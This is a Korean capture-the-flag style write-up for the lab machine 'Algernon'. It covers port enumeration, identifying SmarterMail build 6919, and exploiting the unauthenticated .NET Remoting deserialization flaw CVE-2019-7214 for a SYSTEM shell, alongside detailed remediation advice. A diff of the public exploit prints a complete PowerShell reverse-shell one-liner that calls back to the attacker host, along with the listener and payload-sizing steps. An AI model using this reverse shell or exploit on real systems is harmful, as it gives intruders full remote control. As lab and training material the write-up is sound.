---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/deserialization
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.248.65
ports: [21, 80, 135, 139, 445, 9998, 17001]
services: [ftp, http, microsoft-ds, msrpc, netbios-ssn, remoting]
cves: [CVE-2019-7214]
status: solved
manual_tags: true
manual_cves: true
manual_ports: true
manual_services: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.248.65`(`algernon`) · Microsoft Windows 10 Pro Build 18363 x64 · WORKGROUP · 공격자 tun0 `192.168.45.207`
> 플래그 1개 — `proof.txt` 만 존재. `local.txt` 는 배치되지 않음
> 진입점 — 9998 SmarterMail 웹 UI 로 빌드 6919 확정 → 17001/tcp .NET Remoting 엔드포인트의 무인증 `BinaryFormatter` 역직렬화(CVE-2019-7214, EDB 49216) → 리버스셸
> 권한상승 — 없음. `MailService` 가 `LocalSystem` 구동이라 최초 셸이 곧 `nt authority\system`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.65

### Initial Access – 비표준 포트의 .NET Remoting 엔드포인트가 무인증 역직렬화로 SYSTEM 코드 실행을 내줌

**Vulnerability Explanation:** SmarterMail `MailService.exe` 가 17001/tcp 에 .NET Remoting TCP 채널을 인증 없이 공개함.
- 채널이 호출 인자를 `BinaryFormatter` 로 역직렬화 — 스트림에 적힌 타입 이름을 그대로 로드·복원하므로 복원 콜백을 공격자가 고르게 됨. 그 콜백들을 엮은 것이 가젯 체인이고, 결과가 임의 명령 실행
- **역직렬화는 메서드 호출 «전»에 일어남** — 인증 로직이 있어도 인자를 풀어야 그것을 부를 수 있으므로 인증 전에 이미 코드가 돎
- 취약 범위는 빌드 6985 미만(16.x 이하 포함). 타겟은 `100.0.6919.30415`
- 전송은 HTTP 가 아니라 `.NET` 매직 4바이트로 시작하는 원시 TCP 프레임. 웹 포트(9998)로 같은 바이트를 보내면 IIS 가 `400 Bad Request - Invalid Verb` 로 거절함
- `MailService` 가 `LocalSystem` 으로 구동돼 실행된 코드가 곧 SYSTEM

**Vulnerability Fix:**
- 빌드 6985 이상으로 패치. 이 패치는 엔드포인트를 없애는 것이 아니라 **17001 을 `127.0.0.1` 로만 바인딩**하는 것이라, 저권한으로 침해된 뒤의 로컬 권한상승 벡터로는 남음(출처: Metasploit `exploits/windows/http/smartermail_rce.rb` 모듈 설명)
- 17001 을 방화벽·관리 VLAN 으로 격리. .NET Remoting 을 걷어낼 수 없으면 `typeFilterLevel` 을 `Low` 로 낮춰 델리게이트 계열 가젯을 차단할 것
- `MailService` 를 `LocalSystem` 이 아닌 전용 저권한 계정으로 구동. 그것만으로 이 익스플로잇의 결과가 SYSTEM → 제한 계정으로 떨어지고 공격자에게 권한상승 단계가 추가됨
- 신뢰 경계를 넘는 데이터에 `BinaryFormatter` 를 쓰지 말 것. `System.Text.Json` 이나 `DataContractSerializer`(+`KnownTypes` 화이트리스트)로 대체 — .NET 9 부터는 구현이 제거돼 호출하면 `PlatformNotSupportedException` 이 남
- 익명 FTP(21) 비활성화 — 메일 스풀·로그가 인증 없이 읽혀서는 안 됨. 최소한 `Logs`·`Spool` 을 FTP 루트 밖으로 뺄 것
- 서버의 아웃바운드 이그레스 필터링. 이 공격은 리버스셸에 의존하므로 이그레스 차단만으로 실질적으로 무력화됨
- 80/tcp `TRACE` 비활성화 — 직접적 위협은 아니나 `http-methods` 에 잡힘

**우선순위 하나만 고른다면 서비스 계정 강등임.** 패치는 벤더 일정에 묶이지만 `LocalSystem` 을 저권한 계정으로 바꾸는 것은 오늘 할 수 있고 **미지의 취약점에도 효과가 있음.**

**Severity:** Critical — 무인증 원격 RCE, 즉시 `NT AUTHORITY\SYSTEM`

**Steps to reproduce the attack:**
1. `nmap -p-` 전수 스캔으로 9998·17001 확보
2. 9998 SmarterMail 웹 UI 응답에서 빌드 6919 확정
3. `searchsploit -m 49216` 으로 EDB 49216(CVE-2019-7214 PoC) 회수
4. `HOST`·`LHOST`·`LPORT` 세 변수만 수정
5. Kali 에 80/tcp 리스너 기동
6. 스크립트 실행 → 리스너에 SYSTEM 리버스셸 도착

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.65 | TCP: 21, 80, 135, 139, 445, 9998, 17001 |

`5040/tcp` 와 `49664`–`49669/tcp` 도 열려 있었으나 Windows 자체가 여는 동적 RPC·내부 포트라 공격면에서 제외함. 소유 프로세스는 확인하지 않음(관측 없음).

**빠른 스캔 — 전수 스캔을 기다리지 않기 위해 의심 포트만 먼저**

```bash
ssh kali@10.44.44.128 "sudo nmap --privileged -Pn -n -p 80,443,9998,17001,25,110,143,587,3389,135,445 -sS -T4 -oN /home/kali/PG/Algernon/nmap_quick.log 192.168.248.65"
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 10:59:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -n -p 80,443,9998,17001,25,110,143,587,3389,135,445 -sS -T4 -oN /home/kali/PG/Algernon/nmap_quick.log 192.168.248.65
Nmap scan report for 192.168.248.65
Host is up (0.26s latency).

PORT      STATE  SERVICE
25/tcp    closed smtp
80/tcp    open   http
110/tcp   closed pop3
135/tcp   open   msrpc
143/tcp   closed imap
443/tcp   closed https
445/tcp   open   microsoft-ds
587/tcp   closed submission
3389/tcp  closed ms-wbt-server
9998/tcp  open   distinct32
17001/tcp open   unknown

# Nmap done at Thu Aug 20 10:59:01 2026 -- 1 IP address (1 host up) scanned in 1.32 seconds
```
— 출처: `~/PG/Algernon/nmap_quick.log`

1.32초에 두 가지가 확정됨.

- **9998 과 17001 이 둘 다 열림.** 사전 정보는 9998 을, 개인 노트는 17001 을 지목했는데 둘 다 열려 있어 어느 쪽도 배제 불가. 해소는 프로토콜로 함(아래 역할 분리 표)
- **25/110/143/587 이 전부 closed.** 메일 서버 제품이 도는데 SMTP·POP3·IMAP 이 닫혀 있음 = 이 박스의 SmarterMail 은 「메일을 주고받는 서버」로 노출된 것이 아니라 웹 UI + 관리 채널만 열린 것. 메일 프로토콜 공격면은 없다고 판단하고 버림

**전수 스캔**

```bash
ssh kali@10.44.44.128 "sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Algernon/nmap.log 192.168.248.65"
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 11:02:12 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Algernon/nmap.log 192.168.248.65
Nmap scan report for 192.168.248.65
Host is up (0.084s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-19-26  06:57PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Thu, 20 Aug 2026 02:05:23 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/20%OT=21%CT=1%CU=42356%PV=Y%DS=4%DC=T%G=Y%TM=6A8660F
OS:4%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ
OS:(SP=103%GCD=2%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%
OS:TS=U)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW
OS:8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FF
OS:FF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=N)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5
OS:78NW8NNS%CC=N%Q=)T1(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3
OS:(R=N)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O
OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-20T02:05:27
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   84.55 ms 192.168.45.1
2   84.51 ms 192.168.45.254
3   84.62 ms 192.168.251.1
4   84.86 ms 192.168.248.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 11:05:40 2026 -- 1 IP address (1 host up) scanned in 208.01 seconds
```
— 출처: `~/PG/Algernon/nmap.log`

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | **입구인 17001 을 통째로 놓침.** `17001/tcp` 는 `nmap-services` 에 등재조차 없어 top-1000 밖임(아래 유보 참조) |
| `-sCV` | 기본 NSE + 버전 탐지 | `ftp-anon` 과 `17001/tcp open remoting MS .NET Remoting services` 판정이 여기서 나옴. `-sS` 만 돌리면 17001 은 `unknown` |
| `-Pn` | ping 생략 | Windows 방화벽은 ICMP 를 흔히 막음. 빼면 host down 으로 오판 |
| `-A` | OS 탐지 + traceroute + 스크립트 | OS 지문은 `No exact OS matches` 로 실패함. `-A` 가 항상 답을 주지는 않음 — 실제 OS 는 셸을 잡은 뒤 `systeminfo` 로 확정 |
| `--min-rate 5000` | 초당 최소 5000패킷 | 208초로 단축. 대신 오차 위험이 생김 → 저레이트로 교차검증 |

⚠️ **「9998 도 top-1000 밖」은 성립하지 않음.** Kali 7.98 의 `/usr/share/nmap/nmap-services` 에서 `9998/tcp` 는 빈도 `0.000304` 로 등재돼 있고, tcp 항목을 빈도순으로 정렬했을 때 1000번째 항목의 빈도는 `0.000152` 임 — 즉 **9998 은 top-1000 안**임. `17001/tcp` 는 파일에 아예 없어서 `-sS` 가 `unknown` 으로 찍은 것이고, 이쪽만 top-1000 밖임. 정리하면 `-p-` 가 없어도 정보원(9998)은 보이고 **입구(17001)만 안 보임.**

**이 출력에서 읽어야 할 줄 셋**

1. `Not shown: 65521 closed tcp ports (reset)` — **filtered 가 아니라 closed(RST).** 인바운드 방화벽이 없다는 뜻이라 포트 상태를 그대로 신뢰해도 됨. [[Squid]] 의 `65529 filtered` 와 정반대 상황
2. `17001/tcp open remoting MS .NET Remoting services` — nmap 이 이름까지 붙여줌. .NET Remoting 은 폐기 권고된 레거시 RPC 이고 역직렬화 공격의 고전적 표적
3. `ftp-anon: Anonymous FTP login allowed` + `ImapRetrieval / Logs / PopRetrieval / Spool` — 이 디렉터리 이름 넷은 SmarterMail 데이터 디렉터리의 시그니처. FTP 루트가 메일 스풀에 붙어 있음

**저레이트 교차검증**

```bash
ssh kali@10.44.44.128 "sudo nmap -sS -p- -Pn -n --max-rate 500 -T3 -oN /home/kali/PG/Algernon/nmap_lowrate_crosscheck.log 192.168.248.65"
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 11:05:22 2026 as: /usr/lib/nmap/nmap -sS -p- -Pn -n --max-rate 500 -T3 -oN /home/kali/PG/Algernon/nmap_lowrate_crosscheck.log 192.168.248.65
Nmap scan report for 192.168.248.65
Host is up (0.086s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
9998/tcp  open  distinct32
17001/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Thu Aug 20 11:08:08 2026 -- 1 IP address (1 host up) scanned in 165.81 seconds
```
— 출처: `~/PG/Algernon/nmap_lowrate_crosscheck.log`

**14개 포트가 고레이트 결과와 그대로 일치 — 이 박스에서는 오탐·누락 없음.** 고레이트 스캔의 오차는 누락 방향으로만 나는 것이 아니라 **유령 포트를 만들어내기도 함**([[Muddy]] 는 `--min-rate 5000` 이 443·808·908 을 열림으로 오보고). 두 스캔이 겹치는 포트만 확정 사실로 취급할 것.

⚠️ **저레이트 결과의 `9998 distinct32`·`17001 unknown` 을 서비스 판정으로 읽지 말 것.** `-sS` 는 포트 번호로 `/usr/share/nmap/nmap-services` 표를 찍을 뿐임 — `distinct32` 는 IANA 등록명이지 실제로 도는 것과 무관하고, 17001 은 표에 없어 `unknown` 이 됨. **서비스 이름은 `-sV` 결과만 신뢰할 것.**

**9998 과 17001 의 역할 분리**

| 포트 | 실제 정체 | 근거 | 익스플로잇 대상인가 |
|---|---|---|---|
| 80 | IIS 10.0 기본 사이트 | `http-title: IIS Windows`(기본 시작 페이지) | 아님 — 빈 껍데기 |
| 9998 | SmarterMail 웹 인터페이스(IIS 호스팅) | `Requested resource was /interface/root`, `Microsoft-HTTPAPI/2.0` | 아님 — 버전 판정용 정보원 |
| 17001 | .NET Remoting 서비스 채널 | `-sV` 가 `remoting MS .NET Remoting services` 로 판정 | **여기가 입구** |

두 정보원이 갈렸을 때 물을 것은 「누가 맞나」가 아니라 **「역할이 다른가」**임. 하나의 제품이 웹 UI·API·관리 RPC 를 서로 다른 포트로 여는 것은 흔하고, 이 박스는 「둘 다 맞다」가 정답이었음. 익스플로잇 코드가 `PORT=17001` 을 기본값으로 갖고 있다는 사실 자체가 결정적 단서 — 원본을 읽지 않고 IP 만 바꿔 쏘는 습관이었으면 놓쳤을 것임.

⚠️ **9998 로 `.NET` 프레임을 보내면 IIS 가 `400 Bad Request - Invalid Verb` 를 반환함** — 전수 스캔 출력의 `uptime-agent-info` 블록이 정확히 그 응답임. 두 포트를 혼동하면 정상 동작하는 익스플로잇을 「안 먹힌다」고 버리게 됨. `[가정]` 사전 정보가 9998 을 지목한 것은 Metasploit 모듈이 `RPORT` 기본값을 9998, `TCP_PORT` 를 17001 로 나눠 두었기 때문으로 보임(모듈 옵션에서 확인).

**버전 판정**

9998 에 붙으면 SmarterMail 로그인 화면이 나옴.

![[PG-Algernon-smartermail-login.png]]

화면에는 `Welcome to SmarterMail` 뿐 — 버전 표기 없음. 버전은 소스와 자산 경로, 그리고 디스크 바이너리에 있음.

근거 ① — 런타임에 렌더된 JS 변수:

```bash
ssh kali@10.44.44.128 "curl -s http://192.168.248.65:9998/interface/root | grep -o 'stProductBuild[^;]*'"
```

```text
stProductBuild = "6919 (Dec 11, 2018)"
```

근거 ② — 정적 자산의 캐시버스팅 경로:

```bash
ssh kali@10.44.44.128 "curl -s http://192.168.248.65:9998/interface/root | grep -o 'login-v-[0-9.]*[^\"]*'"
```

```text
login-v-100.0.6919.30414.8d65fc3f1d47d00.min.css
```

⚠️ ①②는 **응답 본문이 `~/PG/Algernon/` 에 보존되지 않아 재확인이 불가함**(박스 정지). 값 자체는 아래 근거 ③과 빌드 번호가 일치함.

근거 ③ — 디스크 바이너리의 버전 리소스(셸 획득 후 확인). 이것만이 산출물로 남아 있음:

```powershell
PS C:\Windows\system32> systeminfo | Select-String -Pattern "OS Name","OS Versio
n","System Type","Domain"; (Get-Item "C:\Program Files (x86)\SmarterTools\Smarte
rMail\Service\MailService.exe").VersionInfo | Format-List ProductVersion,FileVer
sion

OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363
System Type:               x64-based PC
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/
2023
Domain:                    WORKGROUP




ProductVersion : 100.0.6919.30415
FileVersion    : 100.0.6919.30415
```
— 출처: `~/PG/Algernon/shell_session.log`

**실제 빌드는 6919.** 사전 정보에 적혀 있던 「build 6985」는 틀림 — EDB 49216 의 제목이 `SmarterMail Build 6985 - Remote Code Execution` 이고 본문이 `SmarterMail before build 6985` 이므로, **취약 상한선을 타겟 빌드로 옮겨 적은 것**임.

②(`30414`, 웹 자산)와 ③(`30415`, 서비스 바이너리)의 마지막 자리가 1 다름. 웹 프로젝트와 서비스 프로젝트의 빌드 리비전이 갈리는 것으로 보임 `[가정]`. 판정에 쓰는 빌드 번호 6919 는 동일하므로 결론에 영향 없음.

**디렉터리 열거 — 80/tcp**

```text
/aspnet_client        (Status: 301) [Size: 159] [--> http://192.168.248.65/aspnet_client/]
```
— 출처: `~/PG/Algernon/gobuster_80.txt`

`aspnet_client` 는 IIS + ASP.NET 설치 시 자동 생성되는 빈 디렉터리. 발견물이 아니라 「ASP.NET 이 깔려 있다」는 지문일 뿐이라 80 은 여기서 버림.

**디렉터리 열거 — 9998/tcp**

```text
/api                  (Status: 302) [Size: 132] [--> /interface/root]
/aux                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/aux]
/com1                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com1]
/com2                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com2]
/com3                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com3]
/con                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/con]
/download             (Status: 500) [Size: 36]
/Download             (Status: 500) [Size: 36]
/favicon.ico          (Status: 200) [Size: 32038]
/fonts                (Status: 301) [Size: 156] [--> http://192.168.248.65:9998/fonts/]
/interface            (Status: 301) [Size: 160] [--> http://192.168.248.65:9998/interface/]
/lpt1                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/lpt1]
/lpt2                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/lpt2]
/nul                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/nul]
/prn                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/prn]
/reports              (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/reports/]
/scripts              (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/scripts/]
/Scripts              (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/Scripts/]
/services             (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/services/]
/Services             (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/Services/]
/views                (Status: 200) [Size: 0]
```
— 출처: `~/PG/Algernon/gobuster_9998.txt`

⚠️ **DOS 예약 장치명 아홉 개(`aux`·`con`·`prn`·`nul`·`com1~3`·`lpt1~2`)는 발견물이 아님.** Windows 가 예약한 레거시 디바이스 이름이라 ASP.NET 이 일관되게 `302 → 404 핸들러`를 뱉음. 판별은 목적지로 함 — 전부 `/Interface/errors/404.html?aspxerrorpath=...` 로, 404 를 302 로 포장한 것임. 응답 코드가 아니라 **본문·목적지가 다른가**로 판단할 것.

⚠️ **대소문자 중복(`/scripts`·`/Scripts`, `/services`·`/Services`, `/download`·`/Download`)은 하나의 리소스임.** Windows 파일시스템이 대소문자를 구분하지 않아 양쪽 다 히트함. **다만 리다이렉트 목적지가 정규 표기를 알려주지는 않음** — 위 출력에서 `/scripts` 는 `/scripts/` 로, `/Scripts` 는 `/Scripts/` 로 **각자 자기 표기 그대로** 리다이렉트됨. 즉 IIS 는 요청한 표기에 슬래시만 붙여 돌려주고, 어느 쪽이 디스크상의 이름인지는 이 출력만으로 알 수 없음. 리눅스 타겟에서 같은 중복이 나오면 **정말로 두 디렉터리**일 수 있음.

`/views` 는 200 이지만 Size 0 — 라우트는 있으나 인덱스가 비어 있어 파고들 가치 없음.

**웹 열거의 결론 — 얻은 것은 「SmarterMail 이 맞다」와 「빌드 6919」뿐.** 웹 UI 에 자격증명이 없고 로그인도 불가. 입구는 웹이 아님.

**익명 FTP — 이번 풀이에서는 사용하지 않음**

```text
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-19-26  06:57PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
```
— 출처: `~/PG/Algernon/nmap.log`

디렉터리 넷이 전부 SmarterMail 데이터 디렉터리 = 익명 FTP 가 메일 스풀에 그대로 붙어 있음. 아래는 **대안 경로로만 기록**한 것이고 이 박스에서는 실행하지 않았음(관측 없음).

```bash
ftp 192.168.248.65
wget -m --no-passive-ftp ftp://anonymous:anonymous@192.168.248.65/
```

대화형 `ftp` 는 사용자 `anonymous` · 비밀번호는 아무 값이나 받음. `wget -m` 쪽이 재귀 미러링이라 한 번에 끝남.

| 디렉터리 | 노려볼 것 |
|---|---|
| `Spool` | 평문 `.eml` 메일 본문. 자격증명·초대 링크·내부 호스트명이 메일에 적혀 있는 경우가 흔함 |
| `Logs` | SmarterMail 로그. 로그인 시도에 계정명이 남아 사용자 열거가 됨. `08-19-26` 타임스탬프로 보아 활성 로그 |
| `ImapRetrieval` / `PopRetrieval` | 외부 메일 계정 수집 설정. 저장된 외부 계정 자격증명이 있을 수 있음 |

이 박스에서는 17001 경로가 압도적으로 빨라 FTP 를 2순위로 두고 손대지 않았음.

### Initial Access – 17001 .NET Remoting 역직렬화

**익스플로잇 확보**

```bash
ssh kali@10.44.44.128 "cd ~/PG/Algernon && searchsploit smartermail"
ssh kali@10.44.44.128 "cd ~/PG/Algernon && searchsploit -m 49216"
ssh kali@10.44.44.128 "cd ~/PG/Algernon && cp 49216.py exploit_algernon.py"
```

`SmarterMail Build 6985 - Remote Code Execution | windows/remote/49216.py` 가 나옴. **원본은 보존하고 수정본을 별도 파일로 만듦** — 무엇을 바꿨는지 diff 로 증명할 수 있어야 하고, 잘못 고쳤을 때 되돌릴 원본이 필요함.

익스플로잇 헤더가 CVE 와 원 출처를 명시함:

```python
# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
# Tested on: Windows 10 x64
# References:
# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
#
# SmarterMail before build 6985 provides a .NET remoting endpoint
# which is vulnerable to a .NET deserialisation attack.
```
— 출처: `~/PG/Algernon/49216.py`

`before build 6985` 는 **취약 상한선**이지 이 박스의 빌드가 아님. 6985 를 그대로 믿었다면 「패치 버전인데 왜 취약하지?」로 익스플로잇을 불신하거나, 6919 를 발견한 뒤 「6985 가 아니네, 다른 CVE 인가?」로 재조사에 들어갔을 것임.

**무엇을 바꿨는가 — diff 전문**

```diff
--- /home/kali/PG/Algernon/49216.py	2026-08-20 10:59:28.921905973 +0900
+++ /home/kali/PG/Algernon/exploit_algernon.py	2026-08-20 11:00:09.985140672 +0900
@@ -18,10 +18,10 @@
 import sys
 from struct import pack
 
-HOST='192.168.1.1'
+HOST='192.168.248.65'
 PORT=17001
-LHOST='192.168.1.2'
-LPORT=4444
+LHOST='192.168.45.207'
+LPORT=80
 
 psh_shell = '$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
```

| 변수 | 원본 | 수정 | 이유 |
|---|---|---|---|
| `HOST` | `192.168.1.1` | `192.168.248.65` | 타겟 |
| `PORT` | `17001` | 그대로 | .NET Remoting 포트. 이 값이 이미 맞다는 것이 이 익스플로잇이 이 박스용임을 확인해줌 |
| `LHOST` | `192.168.1.2` | `192.168.45.207` | 공격자 `tun0`. `eth0` 가 아님 |
| `LPORT` | `4444` | `80` | 리스너 준비 구간에 이유를 적음 |

**⚠️ `psh_shell` 원라이너와 `payload` base64 는 절대 손대지 말 것 — 1360바이트 제약**

익스플로잇은 base64 페이로드 안의 `X` 1360개를 리버스셸 문자열로 갈아끼움.

```python
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')
...
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
```
— 출처: `~/PG/Algernon/exploit_algernon.py` (`...` 자리는 4KB짜리 `payload = '<base64>'` 한 줄을 생략한 것)

왜 정확히 1360인지는 직렬화 스트림을 뜯으면 나옴.

```text
prefix bytes before /c : b'\x00\x00\xf2\n'
cmdstring: b'/c powershell.exe -encodedCommand XXXXXX'
X count: 1360
len of "/c powershell.exe -encodedCommand ": 34
7bit len decode: 1394
---- psh_shell staging ----
psh chars: 500
utf16le bytes: 1000
b64 len: 1336
after ljust: 1360 pad spaces: 24
```
— 출처: `~/PG/Algernon/exploit_algernon.py` 의 `payload` 디코드부와 `psh_shell` 생성 5줄을 그대로 재실행한 결과

- `BinaryFormatter` 의 `BinaryObjectString` 레코드는 문자열 앞에 **7비트 인코딩 길이 접두사**를 둠. 그 접두사가 `\xf2\x0a` = `(0xF2 & 0x7F) | (0x0A << 7)` = `114 + 1280` = **1394**
- 실제 문자열은 `"/c powershell.exe -encodedCommand "`(34) + `X` 1360개 = **1394**. 계산이 정확히 맞음
- **길이 접두사 1394 는 base64 페이로드 안에 이미 굳어 있어** 페이로드를 다시 생성하지 않는 한 바꿀 수 없음. 치환 문자열은 반드시 정확히 1360바이트여야 함
- **짧으면** `ljust(1360, b' ')` 가 공백으로 채워 문제없음. **길면** `ljust` 는 자르지 않으므로 스트림이 밀려 파싱 실패 → 아무 일도 안 일어남
- 이 박스의 리버스셸은 base64 후 1336바이트라 **여유가 24바이트뿐**임. base64 는 원본 3바이트당 4자로 불어나므로 원라이너에 문자 10여 개만 더 붙어도 초과함

| 만약 이렇게 바꾸면 | 결과 |
|---|---|
| `LPORT=80` → `LPORT=4444` | 원라이너 +2자 → b64 +4자 → 1340. 안전 |
| `LHOST` 15자 + `LPORT=44444` | 원라이너 +4자 → b64 +8자 → 1344. 아슬아슬하게 안전 |
| 원라이너에 AMSI 우회 한 줄 추가 | 거의 확실히 초과 → 조용한 실패 |

**리스너 준비 — 세션은 하나씩 만들고 즉시 검증**

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s alg80 'sudo nc -lvnp 80'"
ssh kali@10.44.44.128 "ss -lntp | grep ':80 '"
ssh kali@10.44.44.128 "tmux ls"
```

⚠️ **tmux 세션은 SSH 호출 하나당 하나씩 만들 것.** 한 호출에 여러 개를 밀어 넣으면 세션 등록과 명령 실행 순서가 어긋나 어느 세션이 어느 포트를 잡았는지가 뒤바뀜 — 그런데 `ss -lntp` 에는 세 포트가 전부 LISTEN 으로 보여 겉으로는 정상임. **「만들었다」와 「의도한 대로 붙어 있다」는 다른 명제이므로 만든 직후 검증할 것.**

`shell_session.log`(1812바이트)는 정확히 80칼럼에서 줄이 접혀 있어 `tee` 가 아니라 `tmux capture-pane` 으로 회수된 것으로 보임 `[가정]`. 회수 방식은 산출물로 남지 않았음.

